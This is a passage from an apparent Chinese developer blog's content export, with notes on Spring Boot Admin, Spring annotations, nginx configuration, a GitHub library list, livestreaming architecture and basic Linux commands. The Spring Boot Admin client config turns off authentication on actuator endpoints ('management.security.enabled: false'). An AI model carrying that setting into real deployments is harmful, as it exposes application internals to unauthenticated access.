.:+o:+o/. `+sssoo+/ CPU: 2x Intel Core i7-7500U CPU @ 2.904GHz .++/+:+oo+o:` /sssooo. RAM: 638MiB / 974MiB /+++//+:`oo+o /::--:. \\+/+o+++`o++o ++////. .++.o+++oo+:` /dddhhh. .+.o+oo:. `oddhhhh+ \\+.++o+o``-````.:ohdhhhhh+ `:o+++ `ohhhhhhhhyo++os: .o:`.syhhhhhhh/.oo++o` /osyyyyyyo++ooo+++/ ````` +oo+++o\\: `oo++. root@bogon:~# 123456789101112131415161718192021222324root@bogon:~# linuxlogo _,met$$$$$gg. ,g$$$$$$$$$$$$$$$P. ,g$$P&quot;&quot; &quot;&quot;&quot;Y$$.&quot;. ,$$P&apos; `$$$. &apos;,$$P ,ggs. `$$b: `d$$&apos; ,$P&quot;&apos; . $$$ ,#. $$P d$&apos; , $$P ##: :## :###: $$: $$. - ,d$$&apos; ##&apos; `## `#&apos; $$; Y$b._ _,d$P&apos; __ ## __ ## __ _ __ _ Y$$. `.`&quot;Y$$$$P&quot;&apos; ,####:## ,######. ##.#####. :### ,######. ###.####: `$$b &quot;-.__ ,##&apos; `### ##: :## ###&apos; `### ##&apos; #: `## `###&apos; `##: `Y$$b ## `## ## ## ##&apos; `## ## ___,## ##: `## `Y$$. ## ## #######: ## ## ## .####### ##&apos; ## `$$b. ## ## ##&apos; ## ## ## ##&apos; `## ## ## `Y$$b. ##. ,## ## ## ,## ## ## ## ## ## `&quot;Y$b._ :#:._,### ##:__,## ##:__,##&apos; ,##. ##.__:##. ## ## `&quot;&quot;&quot;&quot; `:#### ### ######&apos; `######&apos; #### `#####&quot;## ## ##Linux Version 4.4.0-97-generic, Compiled #120-Ubuntu SMP Tue Sep 19 17:28:18 UTC 2017 Two 2.9GHz Intel i7 Processors, 1.9GB RAM, 11616 Bogomips Total bogonroot@bogon:~# 1234567891011 .-. .-&apos;``(|||) ,`\\ \\ `-`. 88 88 / \\ &apos;``-. ` 88 88 .-. , `___: 88 88 88,888, 88 88 ,88888, 88888 88 88 (:::) : ___ 88 88 88 88 88 88 88 88 88 88 88 `-` ` , : 88 88 88 88 88 88 88 88 88 88 88 \\ / ,..-` , 88 88 88 88 88 88 88 88 88 88 88 `./ / .-.` &apos;88888&apos; &apos;88888&apos; &apos;88888&apos; 88 88 &apos;8888 &apos;88888&apos; `-..-( ) `-` 1234567891011121314root@bogon:~# linuxlogo -L 23 .~~. .~~. ___ __ ___ _ &apos;. \\ &apos; &apos; / .&apos; / _ \\___ ___ ___ / / ___ ___ ___ _ __ / _ \\(_) .~ .~~~..~. / , _/ _ `(_-&lt;/ _ \\/ _ \\/ -_) __/ __/ // / / ___/ / : .~.&apos;~&apos;.~. : /_/|_|\\_,_/___/ .__/_.__/\\__/_/ /_/ \\_, / /_/ /_/ ~ ( ) ( ) ~ /_/ /___/ ( : &apos;~&apos;.~.&apos;~&apos; : ) ~ .~ ( ) ~. ~ Linux Version 4.4.0-97-generic ( : &apos;~&apos; : ) Compiled #120-Ubuntu SMP Tue Sep 19 17:28:18 UTC 2017 &apos;~ .~~~. ~&apos; Two 2.9GHz Intel i7 Processors, 1.9GB RAM &apos;~&apos; 11616 Bogomips Total bogon 参考","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[]},{"title":"SpringBoot使用Admin监控应用","slug":"SpringBoot/SpringBoot使用Admin监控应用","date":"2017-11-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.190Z","comments":true,"path":"SpringBoot/SpringBoot使用Admin监控应用/","link":"","permalink":"http://yoursite.com/SpringBoot/SpringBoot使用Admin监控应用/","excerpt":"","text":"spring-boot-admin 分为两部分，server和client。其中，server是监控端，client是被监控端，client就是我们的应用项目。 Server 创建一个springboot项目，创建项目时选择ops-actuator 添加依赖，版本保持最新（参考网上教程写demo时，版本是1.3.2，一直启动不起来） 12345678910 &lt;dependency&gt; &lt;groupId&gt;de.codecentric&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-admin-server&lt;/artifactId&gt; &lt;version&gt;1.5.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;de.codecentric&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-admin-server-ui&lt;/artifactId&gt; &lt;version&gt;1.5.0&lt;/version&gt;&lt;/dependency&gt; 配置 12345server.port=8090spring.application.name=Spring Boot Admin Webspring.boot.admin.url=http://localhost:$&#123;server.port&#125;spring.jackson.serialization.indent_output=trueendpoints.health.sensitive=false 在SpringBootAdminWebApplication上面添加注解 1234567891011121314package com.example.admin;import de.codecentric.boot.admin.config.EnableAdminServer;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;@SpringBootApplication@EnableAdminServerpublic class SpringbootDemoAdminServerApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(SpringbootDemoAdminServerApplication.class, args); &#125;&#125; 启动，如果跑起来了就OK了。 浏览器访问 http://localhost:8090效果： Client 添加依赖 12345&lt;dependency&gt; &lt;groupId&gt;de.codecentric&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-admin-starter-client&lt;/artifactId&gt; &lt;version&gt;1.5.0&lt;/version&gt;&lt;/dependency&gt; 添加配置 1234spring.application.name=@project.description@server.port=8080spring.boot.admin.url=http://localhost:8090management.security.enabled: false management.security.enabled: false 意思是不用授权或者登陆就可以访问，默认是true，server 这样Client就被监控啦 这东西当然不止这么简单，还有更多详细的用法。扩展阅读：https://github.com/codecentric/spring-boot-adminhttp://blog.csdn.net/kinginblue/article/details/52132113","categories":[{"name":"SpringBoot","slug":"SpringBoot","permalink":"http://yoursite.com/categories/SpringBoot/"}],"tags":[]},{"title":"Spring注解@Component、@Repository、@Service、@Controller区别","slug":"SpringBoot/Spring注解@Component、@Repository、@Service、@Controller区别","date":"2017-11-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.195Z","comments":true,"path":"SpringBoot/Spring注解@Component、@Repository、@Service、@Controller区别/","link":"","permalink":"http://yoursite.com/SpringBoot/Spring注解@Component、@Repository、@Service、@Controller区别/","excerpt":"","text":"http://blog.csdn.net/zhang854429783/article/details/6785574","categories":[{"name":"SpringBoot","slug":"SpringBoot","permalink":"http://yoursite.com/categories/SpringBoot/"}],"tags":[]},{"title":"springboot打war包部署到外部Tomcat","slug":"SpringBoot/SpringBoot打war包部署到外部Tomcat","date":"2017-11-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.193Z","comments":true,"path":"SpringBoot/SpringBoot打war包部署到外部Tomcat/","link":"","permalink":"http://yoursite.com/SpringBoot/SpringBoot打war包部署到外部Tomcat/","excerpt":"","text":"配置文件pom.xml 1234567891011&lt;packaging&gt;war&lt;/packaging&gt;-----------------------------------完美分割线&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;scope&gt;provided&lt;/scope&gt;&lt;/dependency&gt;-----------------------------------完美分割线&lt;build&gt; &lt;finalName&gt;testJenkins&lt;/finalName&gt;&lt;/build&gt; application.properties 12345# context-path 和 pom.xml的build-finalName 一致server.context-path=/testJenkins#如果有指定端口，可以去掉。#server.port=9990 编写启动类 123456789public class TomcatServletInitializer extends SpringBootServletInitializer &#123; @Override protected SpringApplicationBuilder configure(SpringApplicationBuilder application) &#123; //Application.class就是springboot的 @SpringBootApplication 类 return application.sources(Application.class); &#125;&#125; 命令打包 1mvn package 参考了此文","categories":[{"name":"SpringBoot","slug":"SpringBoot","permalink":"http://yoursite.com/categories/SpringBoot/"}],"tags":[]},{"title":"Spring注解","slug":"SpringBoot/Spring注解","date":"2017-11-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.194Z","comments":true,"path":"SpringBoot/Spring注解/","link":"","permalink":"http://yoursite.com/SpringBoot/Spring注解/","excerpt":"","text":"Bean 声明注解 @Service 业务逻辑层 @Component 组件 @Repository 数据访问层 @Controller Spring mvc 展现层 @Configurable 声明当前类是一个配置类！！！ @ComponentScan(“com.reachauto.cxn.book.test”) 12设置自动扫描包下面所有的 @Service @Component @Repository @Controller @EnableAsync 1开启异步任务支持 @PropertySource(“classpath:demo.properties”) 123456@Component@PropertySource(&quot;classpath:demo.properties&quot;)public class Demo &#123; @Value(&quot;$&#123;kk.name&#125;&quot;) private String aaa; @EnableScheduling 注解开启对计划任务的支持 Bean 注入注解 @Autowired Spring 提供 @Resource JSR-250 @Value(“xxxx”) 注入普通字符串 @Value(“${xxx.xxx}”) 注入配置文件中字符串 @PostConstruct 标注在方法上，在构造函数执行完毕后执行 @PreDestroy Bean 标注在方法上，销毁前执行 @Async 异步方法表明，若是在class上则全是 @Scheduled 声明方法是计划任务 @Conditional() 条件注解，当满足某条件时 Spring MCV @RequestMapping 12用于映射Web请求 返回体，编码格式都可以在此处设置 produces = &#123;&#125; 设置返回值json/xml charset 等 @RestController 1这是个组合注解，组合了@Controller和@ResponseBody @ResponseBody 12支持返回体放入response体中，而不是直接返回一个页面，此注解可以放在返回值或者方法体上 @RequestBody 1允许参数在request体里，而不是在地址栏后面 @PathVariable 1用来接收路径参数，api/&#123;id&#125; https://gumutianqi1.gitbooks.io/specification-doc/content/tools-doc/basic-annotation.html","categories":[{"name":"SpringBoot","slug":"SpringBoot","permalink":"http://yoursite.com/categories/SpringBoot/"}],"tags":[]},{"title":"nginx不转发header","slug":"Web后端/Nginx不转发header","date":"2017-11-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.207Z","comments":true,"path":"Web后端/Nginx不转发header/","link":"","permalink":"http://yoursite.com/Web后端/Nginx不转发header/","excerpt":"","text":"如果header有下划线，是不转发的，如果一定要下划线，要在配置 http{} 加入 underscores_in_headers on; 参考","categories":[{"name":"Web后端","slug":"Web后端","permalink":"http://yoursite.com/categories/Web后端/"}],"tags":[{"name":"nginx","slug":"nginx","permalink":"http://yoursite.com/tags/nginx/"}]},{"title":"nginx反向代理保留远程IP","slug":"Web后端/Nginx反向代理保留远程IP","date":"2017-11-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.207Z","comments":true,"path":"Web后端/Nginx反向代理保留远程IP/","link":"","permalink":"http://yoursite.com/Web后端/Nginx反向代理保留远程IP/","excerpt":"","text":"如果使用Nginx做反向代理到本地的SpringBoot服务，那么SpringBoot服务获取的远程 地址IP是nginx的，如何获取客户端的IP呢？ 有一简单的方法是通过设置一个自定义Header来实现。123456789101112server &#123; listen 80; server_name 127.0.0.1:80; location / &#123; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header REMOTE-HOST $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://127.0.0.1:8282/api/; &#125;&#125; SpringBoot内获取客户端的真实IP1234567// HttpServletRequest//这里其实是nginx的IP，则本地。String nginxIP = request.getRemoteAddr(); //自己设置的自定义Header，为请求clicent端的IP。String clientIP = request.getHeader(\"X-Real-IP\");","categories":[{"name":"Web后端","slug":"Web后端","permalink":"http://yoursite.com/categories/Web后端/"}],"tags":[{"name":"nginx","slug":"nginx","permalink":"http://yoursite.com/tags/nginx/"}]},{"title":"nginx日志管理","slug":"Web后端/Nginx日志管理","date":"2017-11-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.209Z","comments":true,"path":"Web后端/Nginx日志管理/","link":"","permalink":"http://yoursite.com/Web后端/Nginx日志管理/","excerpt":"","text":"1. 最简单的全局日志全部server的日志都记录再统计一个log文件。12345678910111213141516171819202122http &#123; ... ## # Logging Settings ## access_log /var/log/nginx/access.log; error_log /var/log/nginx/error.log; server&#123; *** &#125; server&#123; *** &#125; ...&#125; 2. server局部日志每个server单独分配一个log文件，可以避免不同server之间的日志混淆，可以更加清晰的分析日志。1234567891011121314151617181920... ## # 全局Logging Settings ## access_log /var/log/nginx/access.log; error_log /var/log/nginx/error.log; ... # 此server单独一个日志文件 server&#123; access_log /var/log/nginx/access_test.log; error_log /var/log/nginx/error_test.log; *** &#125; # 此server使用默认的全局 server&#123; *** &#125; 3. 自定义日志格式12345678910http &#123; log_format main '$remote_addr - $remote_user [$time_local] \"$request\" ' '$status $body_bytes_sent \"$http_referer\" ' '\"$http_user_agent\" \"$http_x_forwarded_for\"'; access_log logs/access.log main; error_log logs/access.log ; ...&#125;","categories":[{"name":"Web后端","slug":"Web后端","permalink":"http://yoursite.com/categories/Web后端/"}],"tags":[{"name":"nginx","slug":"nginx","permalink":"http://yoursite.com/tags/nginx/"}]},{"title":"GitHub资源备忘2017","slug":"github/GitHub资源备忘2017","date":"2017-11-30T01:52:36.000Z","updated":"2018-03-16T01:52:36.000Z","comments":true,"path":"github/GitHub资源备忘2017/","link":"","permalink":"http://yoursite.com/github/GitHub资源备忘2017/","excerpt":"","text":"https://github.com/trending/java anproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具 (Java)Gitee P2P传输(流媒体+P2P)SDK库，功能强大的内网穿透（UDP打洞）库，支持rtmp、hls、sip等多种协议(C++库)Github Libjingle 是一个方便实现P2P传输的开源库(由Google公司用C++开发)Github Android FTP服务器实现Github 算法可视化学习Github 用Java实现所有算法Github Android示例Github App打印Android的日志Github 卡片视图Github 封装Canvas库Github 一个易用且高效的商用级UI库Github Label 辅助类Github 一个给RecyclerView增加弹性动画的库（iOS的tableview效果）Github 收藏/点赞等动画Github 收藏的动画Github FloatingButton动画展示弹框Github TabLayout底部导航Github 贝尔曲线loading动画Github Github 32种样式的动画展开或隐藏菜单Github,支持Android和iOS. 视频播放进度调节Github 浏览器指纹库（Html标识唯一设备）Github浏览器的唯一特征，就像人的指纹一样。可以匿名识别Web浏览器，准确率高达94%。通过查询浏览器的代理字符串，屏幕色深，语言，插件安装与支持的 MIME 类型，时区偏移量和其他功能，如本地存储和会话存储等等，然后这些值通过散列函数传递产生指纹，不需要通过 Cookie 存储就可以识别浏览器。 js全栈工程师培训材料Github 分析某些开源库实现的原理Github 字体效果Github android 逆向工程工具集Github 根据当前Android系统播放音乐回调的FFT数据绘画visualizerNier-Visualizer android-audio-visualizer jadxGithub HanLP自然语言处理 中文分词自然语言处理 中文分词 词性标注 命名实体识别 依存句法分析 关键词提取 新词发现 短语提取 自动摘要 文本分类 拼音简繁Github Jcseg轻量级中文分词器Github集成了关键字提取，关键短语提取，关键句子提取和文章自动摘要等功能，并且提供了一个基于Jetty的web服务器，方便各大语言直接http调用 Android录屏Github Google的Android截屏示例代码Github RTMP直播推流客户端Github该项目借鉴了以下项目：srs-seaSimpleRtmpMagicCamerax264mp4parser 挡位调节器Github 通过SVG来做动画Github 粒子动画Github 一个用粒子动画显示文字的 Android 自定义 ViewGithub 支持 SingleLine 模式的标签云效果Github 这种效果可以用google的FlexboxLayout实现示例1示例2 ToggleButtonGroupGithub ToggleDrawableGithub 一款来自 一款自制表情包键盘Github 一款提供后台任务管理能力的框架Github 一款提供设置沉浸式状态栏样式能力的框架Github 一款高效、稳定、灵活、易用的文件下载引擎Github 一款基于注解的提供解决运行时危险权限方案的框架Github 一款提供可爱动画集合的框架Github 一款提供场景转换过渡能力的动画框架Github Camera Android API高级易用性封装库Github Google 风格的 Page Indicator 效果Github 分析github用户的概况Github Netty 实战-精简翻译Github 基于IJKPlayer，实现了多功能的视频播放器Github LAME源码 LAME 是最好的MP3编码库，可以将PCM文件编码为MP3文件。 以下库对LAME封装，可以直接使用。TAndroidLamejava-lameiOSMp3Recorder mp3agicGithub 一个java库，读取mp3的各种信息 圆形菜单Github 一个强大易用的安卓工具类库它合理地封装了安卓开发中常用的函数，具有完善的Demo和单元测试，利用其封装好的 APIs可以大大提高开发效率。Github 知乎-漂亮的图片选择器Github BottomSheetLayoutGithub Android-BootstrapGithub FragmentStackGithub 蓝牙BLE库 Bluetooth-LE-Library—AndroidGithub CircularFillableLoadersGithub SectorProgressViewGithub UltimateRecyclerViewGithub ArcSeekBarGithub DropDownViewGithub FFTGithub GifLoadingViewGithub 背景模糊Github pull-to-make-soupGithub TextView 的扩展 ExpandableTextViewGithub 扩展Github 列表扩展 ExpandableLayoutGithub ScalingLayoutGithub Android开发人员不得不收集的代码Github Luban(鲁班)——可能是最接近微信朋友圈的图片压缩算法Github Android 资源大全中文版（Android资源大全中文版，包括：图表、游戏开发、GUI、崩溃检测、调试工具等，由伯乐在线持续更新。）Github The MQTT client for Node.js and the browserGithub MQTT broker as a moduleGithub crypto-js为 JavaScript 提供了各种各样的加密算法Githubhttps://github.com/brix/crypto-jshttp://www.oschina.net/p/crypto-js 卡片Github 跑马灯Github ObservableScrollViewGithub 简化adapter代码的库，可以学习他的源码 base-adapter-helperGithub RecyclerView关键字start最多的一个库Github RecyclerView优秀文集Github FlexibleAdapterGithub SkeletonView(Swift)Github Skeleton(Android)Github transitionerGithub Android蓝牙FastBleGithub这个库虽然开发中不会用，但他的经验可以看看。 …","categories":[{"name":"Github","slug":"Github","permalink":"http://yoursite.com/categories/Github/"}],"tags":[{"name":"github","slug":"github","permalink":"http://yoursite.com/tags/github/"}]},{"title":"较全的直播技术导航","slug":"音视频/较全的直播技术导航","date":"2017-11-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.320Z","comments":true,"path":"音视频/较全的直播技术导航/","link":"","permalink":"http://yoursite.com/音视频/较全的直播技术导航/","excerpt":"","text":"较全的直播技术导航https://github.com/DyncLang/DevLiveBook 关于视频直播技术，你想要知道的都在这里了（三）编码和封装","categories":[{"name":"音视频","slug":"音视频","permalink":"http://yoursite.com/categories/音视频/"}],"tags":[]},{"title":"搭建一个完整的视频直播系统","slug":"音视频/搭建一个完整的视频直播系统","date":"2017-11-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.319Z","comments":true,"path":"音视频/搭建一个完整的视频直播系统/","link":"","permalink":"http://yoursite.com/音视频/搭建一个完整的视频直播系统/","excerpt":"","text":"本文是对知乎的问答进行感兴趣知识提取，内容太多，以下是不完全提取，阅读原文 传送门 直播Android主播端解决方案github 他推流用的是 JavaCV 库 ，JavaCV 是一款开源的视觉处理库，基于GPLv2协议，对各种常用计算机视觉库封装后的一组jar包，其中就有ffmpeg，可以直接拿来作为推流用。 视频直播解决方案Android使用FFMpeg实现推送视频直播流到服务器如何在网页端和移动端播放Rtmp和hls视频流 小白龙 励志成为较全的直播技术导航_AnyRTC Jackie L 视频采集：直播视频采集是比较难解决的技术，主流的是IOS和安卓，IOS比较好适配些，是人都知道，国外有款免费的Live:Air Solo 的APP，建议直接拿来使用好些，安卓是非常麻烦的平台，由于安卓本身碎片化的原因，最让程序员头疼的就是解决安卓适配的问题，如果要做安卓端的，建议要好好下功夫；其次是PC端，PC端可以分为网页上发起直播和客户端 上发起直播，网页上发起直播比较方便些，开发的技术也不难，但是其稳定性不好，不是很建议使用。客户端的话开发难度就相对更大些， 国内很多厂商的客户端都是基于一款叫做OBS(OpenBroadcaster Software)的直播客户端来做的，建议直接拿来使用，这样可以控制成本。 何李石 采集采集是播放环节中的第一环，iOS 系统因为软硬件种类不多，硬件适配性较好，所以比较简单。Android 则不同，市面上硬件机型非常多，难以做到一个库适配所有硬件。PC 端的采集也跟各种摄像头驱动有关，推荐使用目前市面上最好用的 PC 端开源免费软件 OBS: https://obsproject.com/参考教程：斗鱼游戏直播教程-OBS直播软件篇推荐v3_CN_Home 解码和渲染解码和渲染，也即音视频的播放，目前 iOS 端的播放兼容性较好，在延迟可接受的情况下使用 HLS 协议是最好的选择。Android 的硬件解码和编码一样也存在兼容性问题，目前比较好的开源播放器是基于 ffplay 的 ijkplayer：https://link.zhihu.com/?target=https%3A//github.com/Bilibili/ijkplayer目前，我们七牛在客户端采集、编码解码以及推流拉流加速方面做了很多工作，以上干货也是基于这个过程中踩过的坑整理出来的：https://link.zhihu.com/?target=https%3A//github.com/pili-engineering 黄家浩 –专注云计算，专注视频技术 现在很多的直播toc平台类似映客、花椒、六间房、他们都有主播，伴随这主播的肯定有美颜和特技的一些功能，tob类平台也比较多，展视互动，保利威视，微赞，微吼，腾讯要是自己搭建一套直播系统的话，我建议考虑以下几个因素 1.采集 采集是播放环节中的第一环，iOS 系统比较简单，软硬件适配性较好。Android系统市面上的开源系统非常多，所以很难可以找一个库可以匹配所有的系统。PC 端的采集也跟各种摄像头驱动有关，推荐使用目前市面上最好用的 PC 端开源免费软件 OBS。 2.编码 编码主要难点有两个：1. 处理硬件兼容性问题。2. 在高 fps、低 bitrate 和音质画质之间找到平衡，fps一般建议选择15fps，600K码率。iOS 端硬件兼容性较好。而 Android 的的支持系统比较多，推荐使用软编。 3.推流和传输（CDN） 传输涉及到很多端：从主播端到服务端，从推流服务端到边缘节点，以及再从边缘节点到观众端。推流端和分发端理论上需要支持的并发用户数应该都是千万级的，不过毕竟产生内容的推流端在少数，和消费内容端播放端不是一个量级，但是他们对推流稳定性和速度的要求比播放端高很多，这涉及到所有播放端能否看到直播，以及直播端质量如何。感觉现在的独家CDN太不靠谱，要多家冗余，互相弥补才行。 4.转码 为了让主播推上来的流适配各个平台端各种不同协议，需要在服务端做一些流处理工作，比如转码成不同格式支持不同协议如 RTMP、HLS 和 FLV，一路转多路流来适配各种不同的网络状况和不同分辨率的终端设备。 5.解码（播放） 解码，也即音视频的播放，目前 iOS 端的播放兼容性较好，在延迟可接受的情况下使用 HLS 协议。Android 的硬件解码和编码一样也存在兼容性问题，目前比较好的开源播放器是基于 ffplay 的 ijkplayer，同样也是使用HLS协议。PC端目前国内最好的还是flash，播放的是FLV，h5的直播播放器还在研究当中吧。 直播涉及到音视频，从推流到拉流，需要解决各种兼容性问题，如果技术没有强大的技术团队的话，对于这块硬骨头确实是比较难啃，建议您可以看看现在目前比较好的直播平台，各家也可以对比一下，以稳定，流畅，延时的几个角度出发。 编辑于 2017-08-21","categories":[{"name":"音视频","slug":"音视频","permalink":"http://yoursite.com/categories/音视频/"}],"tags":[]},{"title":"语音识别CMU-Sphinx资料","slug":"音视频/语音识别CMU-Sphinx资料","date":"2017-11-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.319Z","comments":true,"path":"音视频/语音识别CMU-Sphinx资料/","link":"","permalink":"http://yoursite.com/音视频/语音识别CMU-Sphinx资料/","excerpt":"","text":"2017-6-27 11:33 横向对比5大开源语音识别工具包，CMU Sphinx最佳 2012-07-12 Sphinx语音识别学习记录 （四）-小范围语音中文识别 Android平台使用PocketSphinx做离线语音识别，小范围语音99%识别率 Sphinx武林秘籍(上)使用现有的语言模型与声学模型(C语言) cmusphinx sphinx4(Java实现的cmusphinx) pocketsphinx-android-demo …","categories":[{"name":"音视频","slug":"音视频","permalink":"http://yoursite.com/categories/音视频/"}],"tags":[]},{"title":"Java-程序员眼中的-Linux","slug":"Linux/Java-程序员眼中的-Linux","date":"2017-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.164Z","comments":true,"path":"Linux/Java-程序员眼中的-Linux/","link":"","permalink":"http://yoursite.com/Linux/Java-程序员眼中的-Linux/","excerpt":"","text":"https://github.com/judasn/Linux-Tutorial 目录(Contents) Linux 介绍 Ubuntu 介绍 Ubuntu 安装 Ubuntu 设置（目录） CentOS 介绍 CentOS 6 安装 CentOS 7 安装 CentOS 6 和 CentOS 7 差异 CentOS 设置（目录） Ubuntu 安装 VMware VMware 克隆 CentOS 后网卡信息修改 Vim 安装、配置、快捷键列表 Bash 命令 Bash 其他常用命令 Sed 命令 Linux 下常用压缩文件的解压、压缩 Yum 下载安装包及对应依赖包 Zsh 入门 日常维护 nmon 系统性能监控工具 SSH（Secure Shell）介绍 FTP（File Transfer Protocol）介绍 VPN（Virtual Private Network）介绍 NFS（Network FileSystem）介绍 NTP（Network Time Protocol）介绍 Samba 介绍 Crontab 介绍 Iptables 介绍 花生壳-安装介绍 JDK 安装 SVN 安装和配置 Tomcat 安装和配置、优化 Jenkins 安装和配置 Maven 安装和配置 Nexus 安装和配置 MySQL 安装和配置 MySQL 优化 MySQL 测试 MySQL 教程 Redis 安装和配置 MongoDB 安装和配置 Solr 安装和配置 Jira 安装和配置 Jenkins 安装和配置 TeamCity 安装和配置 Nginx 安装和配置 FastDFS 安装和配置 FastDFS 结合 GraphicsMagick RabbitMQ 安装和配置 Openfire 安装和配置 Rap 安装和配置 Nginx + Keepalived 高可用 黑客入侵检查 Shadowsocks 安装和配置 Mycat 安装和配置 Zookeeper 安装和配置 Daemontools 工具介绍 Tmux 安装和配置 ELK 日志收集系统安装和配置 Dubbo 安装和配置 GitLab 安装和配置 Docker 安装和使用 LDAP 安装和使用 Alfresco 安装和使用","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[]},{"title":"Linux（Ubuntu）-常用命令","slug":"Linux/Linux（Ubuntu）-常用命令","date":"2017-08-30T01:52:36.000Z","updated":"2021-12-28T03:24:10.167Z","comments":true,"path":"Linux/Linux（Ubuntu）-常用命令/","link":"","permalink":"http://yoursite.com/Linux/Linux（Ubuntu）-常用命令/","excerpt":"","text":"压缩打包tar123456# 仅打包(不压缩)$ tar -cvf /tmp/etc.tar /etc# gzip格式压缩（ z参数 .tar.gz 或 .tgz）$ tar -czvf /tmp/etc.tar.gz /etc# bzip2格式压缩（j 参数 .tar.bz2）$ tar -cjvf /tmp/etc.tar.bz2 /etc zip 打包目录1$ zip -r -o -9 test.zip test/ -r 递归 ，-o 输出文件 ， -9 压缩比例(1~9) 查看哪个目录占用空间大（比较耗时）12345678910111213141516171819202122232425262728root@bogon:/# du -s /* | sort -nr9199072 /usr1943584 /var1858812 /root746372 /home733020 /lib104728 /boot20356 /lost+found13616 /sbin12644 /bin9308 /etc6068 /run3952 /lib32172 /dump48 /tmp20 /data16 /opt12 /media8 /srv4 /mnt4 /lib640 /vmlinuz.old0 /vmlinuz0 /sys0 /proc0 /initrd.img.old0 /initrd.img0 /dev 查看当前目录文件大小情况123456789101112$ du -h8.0K ./.cmake/packages/libwebsockets12K ./.cmake/packages128K ./.java8.0K ./.vim...省略16K ./.aptitude12K ./.w3m8.0K ./.config/configstore12K ./.config54M . 创建一个有sudo权限的用户参考123456root@bogon:~$ adduser user1root@bogon:~$ passwd user1root@bogon:~$ usermod -aG sudo user1 #添加到sudo组（必须）root@bogon:~$ id user1 # 确认组信息root@bogon:~$ sudo ls -l /root # 测试sudo命令root@bogon:~$ 用户shell环境通过 adduser 新建的用户，登录之后没有shell环境，终端不会显示用户名和路径,12root@bogon:~$ vim /etc/passwd # 编辑passwd文件 46 user1:x:1003:1003::/home/user1:/bin/bash #给用户增加 /bin/bash 修改用户所属的组12root@bogon:~$ usermod -g root user1 #修改到root组root@bogon:~$ usermod -d /home/samwen samwen #修改用户登入时的目录 文件权限chmod修改权限Linux的文件权限12345samwen@bogon:~$ mkdir testsamwen@bogon:~$ vim hello.txtsamwen@bogon:~$ ls -lldrwxrwxr-x 2 samwen samwen 4096 Aug 7 17:27 test-rw-rw-r-- 1 samwen samwen 6 Aug 7 17:33 hello.txt 目标 目录 用户 组用户 其他 总值 test d rwx rwx r-x 775 hello.txt - rw- rw- r– 664 r ： 只读权限，值等于 4 。 w ： 只写权限，值等于 2 。 x ： 执行权限，值等于 1 。 -： 无权限，值等于 0 。 修改权限 1root@bogon:/home/bogon# chmod -R 760 mydir 760 的意思是：用户读/写/执行权限、组用户读/写权限、其他用户无权限。 常用的权限值： 1234567775：默认创建目录的权限664：默认创建文件的权限600：只有所有者有读和写的权限644：所有者有读和写的权限，组用户只有读的权限666：每个人都有读和写的权限700：只有所有者有读和写以及执行的权限777：每个人都有读和写以及执行的权限 查看文件的所有者等信息12345#显示文件夹信息 http://man.linuxde.net/lsls -ld mydir/#显示文件夹内信息ls -lh mydir/ chown修改文件所有者和组123chown -R 组:用户 目录/chown -R bogon:bogon mydir 查找软件的目录123# 查找软件的目录root@openapi:~# whereis iptablesiptables: /sbin/iptables /usr/share/iptables /usr/share/man/man8/iptables.8.gz 查看所有端口和使用者12345678910111213141516#查看所有端口和使用者root@bogon:~/apache-tomcat/bin# netstat -tnlpActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1007/sshd tcp 0 0 0.0.0.0:8060 0.0.0.0:* LISTEN 928/nginx tcp 0 0 127.0.0.1:9121 0.0.0.0:* LISTEN 917/redis_exportertcp 0 0 127.0.0.1:9090 0.0.0.0:* LISTEN 927/prometheus tcp 0 0 127.0.0.1:9187 0.0.0.0:* LISTEN 934/postgres_exporttcp 0 0 127.0.0.1:9100 0.0.0.0:* LISTEN 923/node_exportertcp 0 0 127.0.0.1:9168 0.0.0.0:* LISTEN 935/ruby tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN 928/nginx tcp6 0 0 :::22 :::* LISTEN 1007/sshd tcp6 0 0 :::8009 :::* LISTEN 110928/java tcp6 0 0 :::8080 :::* LISTEN 110928/java tcp6 0 0 ::1:9168 :::* LISTEN 935/ruby 查看是谁用了某个端口12345# 查看是谁用了某个端口root@bogon:/etc/init.d# lsof -i:1883COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAMEmosquitto 733 mosquitto 3u IPv4 11835 0t0 TCP *:1883 (LISTEN)mosquitto 733 mosquitto 4u IPv6 11836 0t0 TCP *:1883 (LISTEN) 管理启动服务12# 通过sysv-rc-conf 管理启动服务#sudo apt-get install sysv-rc-conf 开机启动脚本目录12345678910111213# 开机启动脚本目录（/etc/init.d）root@bogon:/etc/init.d# lsacpid glances postfix reboot sudoapparmor grub-common postgresql redis-server udevapport halt pppd-dns resolvconf umountfsatd irqbalance procps rsync umountnfs.shconsole-setup killprocs rabbitmq-server rsyslog umountrootcron kmod rc screen-cleanup unattended-upgradesdbus mysql rc.local sendsigs urandomdns-clean netdata rclocal.backup single 